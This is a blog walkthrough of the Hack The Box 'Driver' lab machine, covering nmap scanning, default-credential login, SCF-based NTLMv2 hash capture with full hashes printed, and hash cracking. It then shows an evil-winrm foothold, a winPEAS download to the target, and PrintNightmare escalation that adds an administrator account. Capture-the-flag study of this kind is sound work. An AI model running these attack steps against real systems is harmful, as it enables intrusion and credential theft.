<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Hack The Box - Driver | Hakune Blog</title><meta name=keywords content="ctf,tech"><meta name=description content="A writeup for Driver machine from Hack The Box"><meta name=author content="Aki Hakune"><link rel=canonical href=https://git-akihakune.github.io/blog/driver><link crossorigin=anonymous href=/assets/css/stylesheet.min.7270dbf20dbcda7a1884928b20795b9be2a182a3ce98cd3fb731a82c6f6993de.css integrity="sha256-cnDb8g282noYhJKLIHlbm+KhgqPOmM0/tzGoLG9pk94=" rel="preload stylesheet" as=style><link rel=preload href=/static/banner.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://git-akihakune.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://git-akihakune.github.io/favicon.ico><link rel=icon type=image/png sizes=32x32 href=https://git-akihakune.github.io/favicon.ico><link rel=apple-touch-icon href=https://git-akihakune.github.io/favicon.ico><link rel=mask-icon href=https://git-akihakune.github.io/favicon.ico><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.96.0"><link rel=alternate hreflang=en href=https://git-akihakune.github.io/blog/driver/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><link rel=manifest href=/hakune.webmanifest><link rel=stylesheet type=text/css href=/hugo-cite.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-F8M24PKNWZ"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-F8M24PKNWZ",{anonymize_ip:!1})}</script><meta property="og:title" content="Hack The Box - Driver"><meta property="og:description" content="A writeup for Driver machine from Hack The Box"><meta property="og:type" content="article"><meta property="og:url" content="https://git-akihakune.github.io/blog/driver/"><meta property="og:image" content="https://git-akihakune.github.io/img/driver/driver.jpeg"><meta property="article:section" content="blog"><meta property="article:published_time" content="2022-02-09T13:08:56+07:00"><meta property="article:modified_time" content="2022-02-09T13:08:56+07:00"><meta property="og:site_name" content="Hakune Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://git-akihakune.github.io/img/driver/driver.jpeg"><meta name=twitter:title content="Hack The Box - Driver"><meta name=twitter:description content="A writeup for Driver machine from Hack The Box"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Blogs","item":"https://git-akihakune.github.io/blog/"},{"@type":"ListItem","position":3,"name":"Hack The Box - Driver","item":"https://git-akihakune.github.io/blog/driver/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Hack The Box - Driver","name":"Hack The Box - Driver","description":"A writeup for Driver machine from Hack The Box","keywords":["ctf","tech"],"articleBody":"Overview To cut a long story short, this is a Windows machine that has an opening web page with guessable credentials, gave us a file upload portal through which can be used to trigger SCF file upload vulnerability, subsequently granted us a shell via WinRM, which showed us a vulnerable printing service that we can take advantage of to get Administrator shell.\nI. Scanning So basically, it’s a Windows box with Samba shares and HTTP port opening.\n# Nmap 7.92 scan initiated Thu Feb 3 21:46:00 2022 as: nmap -sC -sV -p- -oN nmap-fullports.txt driver.htb Nmap scan report for driver.htb Host is up (0.039s latency). Not shown: 65531 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb2-time: | date: 2022-02-04T09:47:57 |_ start_date: 2022-02-03T15:59:59 |_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 7 21:48:32 2022 -- 1 IP address (1 host up) scanned in 151.91 seconds Just don’t forget to scan all ports (with -p- switch) in order not to miss that port 5985.\nUpon opening the web page, the site asked for HTTP Basic Authentication.\nII. Failed enumeration attempts At first glance, I didn’t bother with the login form and looked for other endpoints instead. However, looking at Gobuster scan result:\n# Port 80 scan result /images (Status: 403) [Size: 1233] /%c3%90%c2%a0%c3%91%c2%83%c3%91%c2%81%c3%91%c2%81%c3%90%c2%ba%c3%90%c2%b8%c3%90%c2%b9%c3%90%c2%9f%c3%90%c2%b8%c3%91%c2%82%c3%90%c2%be%c3%90%c2%bd (Status: 400) [Size: 324] /%20%09adobe%20photoshop%20elements%205 (Status: 400) [Size: 324] /%09tuneup (Status: 400) [Size: 324] /alcohol120%1952722c (Status: 400) [Size: 324] And dirbuster result:\n… eventually, I gave up on this attack vector. Then I went to SMB and tried my luck on it.\n┌──(kali㉿kali)-[~/ctf/htb/Driver] └─$ smbclient --no-pass -L //10.10.11.106 session setup failed: NT_STATUS_ACCESS_DENIED  ┌──(kali㉿kali)-[~/ctf/htb/Driver] └─$ smbclient -U guest -L //10.10.11.106/ Enter WORKGROUP\\guest password: session setup failed: NT_STATUS_ACCOUNT_DISABLED To my surprise, guest account was disabled and anonymous access was denied while this’s supposed to be an easy box. Placing a bet on outdated software + public exploits combo also turned out to be a mistake shortly after:\nmsf6 exploit(windows/smb/cve_2020_0796_smbghost)  exploit  [*] Started reverse TCP handler on 10.10.14.8:9999 [*] 10.10.11.106:445 - Running automatic check (\"set AutoCheck false\" to disable) [-] 10.10.11.106:445 - Exploit aborted due to failure: not-vulnerable: The target is not exploitable. \"set ForceExploit true\" to override check result. [*] Exploit completed, but no session was created. # From https://github.com/ZecOps/CVE-2020-0796-RCE-POC $ python3 SMBleedingGhost.py 10.10.11.106 10.10.14.8 8080 CVE-2020-0796 Remote Code Execution POC (c) 2020 ZecOps, Inc.  Target is not vulnerable Some other enumeration attepmts I learnt from HackTricks also felt short as they returned no novel information.\nIII. Successful enumeration attempts Afterwards, somehow I followed my nose and randomly typed admin - password into the HTTP simple login form, as well as admin - pass. In the third attempt with admin - admin, it happily got me through:\nNext, I maniacally clicked on whatever seems clickable. In spite of that, there was nothing but this firmware update page:\nThrough Burp Suite, the page appeared to be a fundamental file uploading page, directly via HTTP POST request, with no validation whatsoever. Wappalyzer suggested a PHP backend, therefore, I tried a PHP reverse shell along with some other web payloads and Windows payloads. Nonetheless, nothing worked, which compelled us to seek out for a better attack vector.\nBut hold on, files, with SMB… At that moment, my mind finally pieced the clues together and the answer suddenly dawned on me: How about a SCF file attack?\nThis straght-to-the-point guide from Pentestlab covered all knowledge needed to start diving into exploiting the vulnerability. Thus, just strictly follow the guide and we got some sweet hashes like this:\nmsf6 auxiliary(server/capture/smb)  exploit [*] Auxiliary module running as background job 1.  [*] Server is running. Listening on 10.10.14.21:445 msf6 auxiliary(server/capture/smb)  [+] Received SMB connection on Auth Capture Server! [SMB] NTLMv2-SSP Client : 10.10.11.106 [SMB] NTLMv2-SSP Username : DRIVER\\tony [SMB] NTLMv2-SSP Hash : tony::DRIVER:7dddc33ef0e24ca4:0365b04698b0c7b26f59c27bd7ceae61:0101000000000000007e17dbda1bd801835bdaa9e8a14d09000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800007e17dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000   [+] Received SMB connection on Auth Capture Server! [SMB] NTLMv2-SSP Client : 10.10.11.106 [SMB] NTLMv2-SSP Username : DRIVER\\tony [SMB] NTLMv2-SSP Hash : tony::DRIVER:e6fbeb49363872ac:cc3944c26e2cb37a604ed94691a61e3a:01010000000000008014b0dbda1bd80185625afe652e0d74000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f0075007300070008008014b0dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000  # and several more that looks pretty much alike Because I didn’t know which one was the “legitimate” hash, using some small scripting tricks I dumped them all into separate files, so as to check them using hashid.\n┌──(kali㉿kali)-[~/ctf/htb/Driver] └─$ hashid userhash --File 'userhash'-- Analyzing 'tony::DRIVER:7dddc33ef0e24ca4:0365b04698b0c7b26f59c27bd7ceae61:0101000000000000007e17dbda1bd801835bdaa9e8a14d09000000000200120061006e006f006e0079006d006f00750073000100120061006e006f006e0079006d006f00750073000' [+] NetNTLMv2 Analyzing '400120061006e006f006e0079006d006f00750073000300120061006e006f006e0079006d006f007500730007000800007e17dbda1bd8010600040002000000080030003000000000000000000000000020000060482ada3a682ca5c10eedb3a409d998e199cf3efff574506cf644e8c94799160a00100' [+] Unknown hash Analyzing '0000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003100000000000000000000000000' [+] Unknown hash --End of file 'userhash'-- ┌──(kali㉿kali)-[~/ctf/htb/Driver] └─$ hashid userhash2 --File 'userhash2'-- Analyzing  [+] NetNTLMv2 --End of file 'userhash2'-- IV. Foothold You will miss all the fun if I let on all the real credentials. For that reason, critical credentials will be redacted from this point onwards.\nA question is, where to use all these hashes? An obvious answer is via the WinRM 5985 port.\nNext question would be, “how”? Well, let’s go for a must-have tool - evil-winrm. Installing instructions are all clearly put accross in its README file, so I’ll not go into details here.\nChecking for options evil-winrm provides, there’s a -H switch to log in with NTML hash. However…\n$ evil-winrm -i driver.htb -u tony -H \"\"  Evil-WinRM shell v3.3  Error: Invalid hash format It didn’t work, and god knows why. Consequently, it was unavoidable to face the hassle of cracking this hash on my potato machine. Thankfully the hash didn’t take donkey’s years to crack.\n$ john userhash2 Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 2 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst Proceeding with incremental:ASCII  (tony) 1g 0:00:02:44 DONE 3/3 (2022-02-07 01:43) 0.006064g/s 957216p/s 957216c/s 957216C/s labzter..lilton3 Use the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably Session completed. With the password now in own hand, it’s a piece of cake getting a shell callback.\n$ evil-winrm -i driver.htb -u tony -p   Evil-WinRM shell v3.3  Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine  Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  Info: Establishing connection to remote endpoint  *Evil-WinRM* PS C:\\Users\\tony\\Documents And the rock stable shell of evil-winrm easily led me to the user flag:\n*Evil-WinRM* PS C:\\Users\\tony\\Desktop Get-ChildItem    Directory: C:\\Users\\tony\\Desktop   Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/7/2022 5:21 AM 34 user.txt V. Privilege Escalation First and foremost, WinPEAS all the way through.\nOn our attacker machine:\nwget https://github.com/carlospolop/PEASS-ng/releases/download/20220206/winPEASany.exe -O finding.exe On the remote shell:\nInvoke-WebRequest -URI http://10.10.14.21/finding.exe -UseBasicParsing -OutFile finding.exe Carefully examining WinPEAS result, we cannot see many exeptional things showed up, but the most notable one is probably a runing service named spoolsv.exe.\nIn short, spoolsv signifies the existence of a printer and printing drivers, which reminds us about the unforgettable PrintNightmare - a vulnerability chain comprises of CVE-2021-34527, CVE-2021-34481 (for RCE) and CVE-2021-1675 (for local privilege escalation). Unquestionably, we will use the last one.\nA quick Github search led me to a C# POC that seems to work.\n  However, its setup called for an abundance of time, so I gave it a miss and tried out this simple script instead.\n  Without further ado, I straghtforwardly followed the README and it smoothly did the trick.\n*Evil-WinRM* PS C:\\Users\\tony\\Downloads Invoke-Nightmare [+] using default new user: adm1n [+] using default new password: P@ssw0rd [+] created payload at C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll [+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_f66d9eed7e835e97\\Amd64\\mxdwdrv.dll\" [+] added user as local administrator [+] deleting payload from C:\\Users\\tony\\AppData\\Local\\Temp\\nightmare.dll At that point, what’s left was to log in using adm1n account (which has Administrator privilege) and snatch the flag.\nevil-winrm -i driver.htb -u adm1n -p P@ssw0rd Root flag can be found effortlessly at Administrator’s Desktop folder.\n*Evil-WinRM* PS C:\\Users\\Administrator cd C:\\Users\\Administrator\\Desktop *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop ls    Directory: C:\\Users\\Administrator\\Desktop   Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 2/8/2022 5:04 AM 34 root.txt And that’s all. Hope you’ve enjoyed this vastly informative box.\n","wordCount":"1417","inLanguage":"en","image":"https://git-akihakune.github.io/img/driver/driver.jpeg","datePublished":"2022-02-09T13:08:56+07:00","dateModified":"2022-02-09T13:08:56+07:00","author":[{"@type":"Person","name":"Aki Hakune"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://git-akihakune.github.io/blog/driver/"},"publisher":{"@type":"Organization","name":"Hakune Blog","logo":{"@type":"ImageObject","url":"https://git-akihakune.github.io/favicon.ico"}}}</script></head><body class=dark id=top><script>localStorage.getItem("pref-theme")==="light"&&document.body.classList.remove("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://git-akihakune.github.io accesskey=h title="Blog (Alt + H)"><img src=https://git-akihakune.github.io/static/banner.png alt=logo aria-label=logo height=40>Blog</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li><li><a href=https://git-akihakune.github.io/vi/ title=Vi aria-label=Vi>Vi</a></li></ul></span></div><ul id=menu><li><a href=https://git-akihakune.github.io/archive/ title=timeline><span>timeline</span></a></li><li><a href=https://git-akihakune.github.io/blog/ title=blog><span>blog</span></a></li><li><a href=https://git-akihakune.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://git-akihakune.github.io/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class="main page"><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://git-akihakune.github.io>Home</a>&nbsp;»&nbsp;<a href=https://git-akihakune.github.io/blog/>Blogs</a></div><h1 class=post-title>Hack The Box - Driver</h1><div class=post-meta><span title="2022-02-09 13:08:56 +0700 +07">February 9, 2022</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Aki Hakune&nbsp;|&nbsp;<a href=https://github.com/git-akihakune/git-akihakune.github.io/tree/main/blog/driver.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><img loading=lazy src=https://git-akihakune.github.io/img/driver/driver.jpeg alt="Hack The Box - Driver"><p>Hack The Box - Driver</p></figure><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#overview aria-label=Overview>Overview</a></li><li><a href=#i-scanning aria-label="I. Scanning">I. Scanning</a></li><li><a href=#ii-failed-enumeration-attempts aria-label="II. Failed enumeration attempts">II. Failed enumeration attempts</a></li><li><a href=#iii-successful-enumeration-attempts aria-label="III. Successful enumeration attempts">III. Successful enumeration attempts</a></li><li><a href=#iv-foothold aria-label="IV. Foothold">IV. Foothold</a></li><li><a href=#v-privilege-escalation aria-label="V. Privilege Escalation">V. Privilege Escalation</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h2><p>To cut a long story short, this is a <a href=#i-scanning>Windows machine</a> that has an opening web page with <a href=#iii-successful-enumeration-attempts>guessable credentials</a>, gave us a file upload portal through which can be used to trigger <a href=#iv-foothold>SCF file upload vulnerability</a>, subsequently granted us a shell via WinRM, which showed us a <a href=#v-privilege-escalation>vulnerable printing service</a> that we can take advantage of to get Administrator shell.</p><h2 id=i-scanning>I. Scanning<a hidden class=anchor aria-hidden=true href=#i-scanning>#</a></h2><p>So basically, it&rsquo;s a Windows box with Samba shares and HTTP port opening.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Nmap 7.92 scan initiated Thu Feb  3 21:46:00 2022 as: nmap -sC -sV -p- -oN nmap-fullports.txt driver.htb</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> driver<span style=color:#f92672>.</span>htb
</span></span><span style=display:flex><span>Host <span style=color:#f92672>is</span> up (<span style=color:#ae81ff>0.039</span>s latency)<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65531</span> filtered tcp ports (no<span style=color:#f92672>-</span>response)
</span></span><span style=display:flex><span>PORT     STATE SERVICE      VERSION
</span></span><span style=display:flex><span><span style=color:#ae81ff>80</span><span style=color:#f92672>/</span>tcp   open  http         Microsoft IIS httpd <span style=color:#ae81ff>10.0</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>auth: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> HTTP<span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>401</span> Unauthorized\x0D
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  Basic realm<span style=color:#f92672>=</span>MFP Firmware Update Center<span style=color:#f92672>.</span> Please enter password <span style=color:#66d9ef>for</span> admin
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> http<span style=color:#f92672>-</span>methods: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  Potentially risky methods: TRACE
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Microsoft<span style=color:#f92672>-</span>IIS<span style=color:#f92672>/</span><span style=color:#ae81ff>10.0</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>135</span><span style=color:#f92672>/</span>tcp  open  msrpc        Microsoft Windows RPC
</span></span><span style=display:flex><span><span style=color:#ae81ff>445</span><span style=color:#f92672>/</span>tcp  open  microsoft<span style=color:#f92672>-</span>ds Microsoft Windows <span style=color:#ae81ff>7</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>10</span> microsoft<span style=color:#f92672>-</span>ds (workgroup: WORKGROUP)
</span></span><span style=display:flex><span><span style=color:#ae81ff>5985</span><span style=color:#f92672>/</span>tcp open  http         Microsoft HTTPAPI httpd <span style=color:#ae81ff>2.0</span> (SSDP<span style=color:#f92672>/</span>UPnP)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>title: Not Found
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_http<span style=color:#f92672>-</span>server<span style=color:#f92672>-</span>header: Microsoft<span style=color:#f92672>-</span>HTTPAPI<span style=color:#f92672>/</span><span style=color:#ae81ff>2.0</span>
</span></span><span style=display:flex><span>Service Info: Host: DRIVER; OS: Windows; CPE: cpe:<span style=color:#f92672>/</span>o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   authentication_level: user
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   challenge_response: supported
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  message_signing: disabled (dangerous, but default)
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>security<span style=color:#f92672>-</span>mode: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   <span style=color:#ae81ff>3.1.1</span>: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_    Message signing enabled but <span style=color:#f92672>not</span> required
</span></span><span style=display:flex><span><span style=color:#f92672>|</span> smb2<span style=color:#f92672>-</span>time: 
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>   date: <span style=color:#ae81ff>2022</span><span style=color:#f92672>-</span><span style=color:#ae81ff>02</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span>T09:<span style=color:#ae81ff>47</span>:<span style=color:#ae81ff>57</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_  start_date: <span style=color:#ae81ff>2022</span><span style=color:#f92672>-</span><span style=color:#ae81ff>02</span><span style=color:#f92672>-</span><span style=color:#ae81ff>03</span>T15:<span style=color:#ae81ff>59</span>:<span style=color:#ae81ff>59</span>
</span></span><span style=display:flex><span><span style=color:#f92672>|</span>_clock<span style=color:#f92672>-</span>skew: mean: <span style=color:#ae81ff>7</span>h00m00s, deviation: <span style=color:#ae81ff>0</span>s, median: <span style=color:#ae81ff>6</span>h59m59s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed<span style=color:#f92672>.</span> Please report any incorrect results at https:<span style=color:#f92672>//</span>nmap<span style=color:#f92672>.</span>org<span style=color:#f92672>/</span>submit<span style=color:#f92672>/</span> <span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Thu Feb 7 21:48:32 2022 -- 1 IP address (1 host up) scanned in 151.91 seconds</span>
</span></span></code></pre></div><p>Just don&rsquo;t forget to scan all ports (with <em><code>-p-</code></em> switch) in order not to miss that <em>port <code>5985</code></em>.</p><p>Upon opening the web page, the site asked for <a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#basic_authentication_scheme>HTTP Basic Authentication</a>.</p><p><img loading=lazy src=/img/driver/http-login.png#center alt></p><h2 id=ii-failed-enumeration-attempts>II. Failed enumeration attempts<a hidden class=anchor aria-hidden=true href=#ii-failed-enumeration-attempts>#</a></h2><p>At first glance, I didn&rsquo;t bother with the login form and looked for other endpoints instead. However, looking at <em>Gobuster</em> scan result:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Port 80 scan result</span>
</span></span><span style=display:flex><span>/images               <span style=color:#f92672>(</span>Status: 403<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 1233<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/%c3%90%c2%a0%c3%91%c2%83%c3%91%c2%81%c3%91%c2%81%c3%90%c2%ba%c3%90%c2%b8%c3%90%c2%b9%c3%90%c2%9f%c3%90%c2%b8%c3%91%c2%82%c3%90%c2%be%c3%90%c2%bd <span style=color:#f92672>(</span>Status: 400<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 324<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/%20%09adobe%20photoshop%20elements%205 <span style=color:#f92672>(</span>Status: 400<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 324<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/%09tuneup            <span style=color:#f92672>(</span>Status: 400<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 324<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/alcohol120%1952722c  <span style=color:#f92672>(</span>Status: 400<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 324<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>And <em>dirbuster</em> result:</p><p><img loading=lazy src=/img/driver/dirbuster.png#center alt></p><p>&mldr; eventually, I gave up on this attack vector. Then I went to SMB and tried my luck on it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/htb/Driver<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ smbclient --no-pass -L //10.10.11.106
</span></span><span style=display:flex><span>session setup failed: NT_STATUS_ACCESS_DENIED
</span></span><span style=display:flex><span>                                                                          
</span></span><span style=display:flex><span>┌──<span style=color:#f92672>(</span>kali㉿kali<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/ctf/htb/Driver<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ smbclient -U guest -L //10.10.11.106/
</span></span><span style=display:flex><span>Enter WORKGROUP<span style=color:#ae81ff>\g</span>uest password: 
</span></span><span style=display:flex><span>session setup failed: NT_STATUS_ACCOUNT_DISABLED
</span></span></code></pre></div><p>To my surprise, <code>guest</code> account was disabled and anonymous access was denied while this&rsquo;s supposed to be an easy box. Placing a bet on <a href=https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796>outdated software + public exploits</a> combo also turned out to be a mistake shortly after:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/smb/cve_2020_0796_smbghost<span style=color:#f92672>)</span> &gt; exploit
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.10.14.8:9999 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.10.11.106:445 - Running automatic check <span style=color:#f92672>(</span><span style=color:#e6db74>&#34;set AutoCheck false&#34;</span> to disable<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> 10.10.11.106:445 - Exploit aborted due to failure: not-vulnerable: The target is not exploitable. <span style=color:#e6db74>&#34;set ForceExploit true&#34;</span> to override check result.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exploit completed, but no session was created.
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># From https://github.com/ZecOps/CVE-2020-0796-RCE-POC</span>
</span></span><span style=display:flex><span>$ python3 SMBleedingGhost.py 10.10.11.106 10.10.14.8 <span style=color:#ae81ff>8080</span>
